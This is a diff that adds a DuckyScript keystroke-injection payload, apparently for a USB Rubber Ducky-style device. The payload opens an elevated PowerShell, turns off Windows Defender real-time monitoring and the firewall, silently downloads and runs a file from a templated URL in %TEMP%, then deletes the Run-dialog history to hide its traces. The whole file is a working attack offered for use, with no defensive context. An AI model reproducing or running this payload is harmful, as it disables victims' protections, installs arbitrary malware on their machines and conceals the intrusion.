@@ -1,0 +1,47 @@
+DELAY 1000
+GUI r
+DELAY 200
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 1000
+ALT y 
+DELAY 200
+STRING Set-MpPreference -DisableRealtimeMonitoring $true
+ENTER
+STRING exit
+ENTER
+REM
+REM DISABLE FIREWALL
+REM
+DELAY 500
+ESCAPE
+CONTROL ESCAPE
+DELAY 400
+STRING cmd
+DELAY 400
+CTRL-SHIFT ENTER
+DELAY 400
+TAB
+DELAY 100
+TAB
+DELAY 100
+ENTER
+DELAY 400
+STRING netsh firewall set opmode mode=disable
+ENTER
+DELAY 400
+STRING exit
+ENTER
+DELAY 500
+GUI R
+DELAY 200
+STRING powershell -windowstyle hidden (new-object System.Net.WebClient).DownloadFile('{0}', '%TEMP%\{1}'); Start-Process "%TEMP%\{1}"
+ENTER
+REM
+REM CLEAR THE RUN HISTORY
+REM
+DELAY 200
+GUI R
+DELAY 200
+STRING powershell "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue"
+ENTER
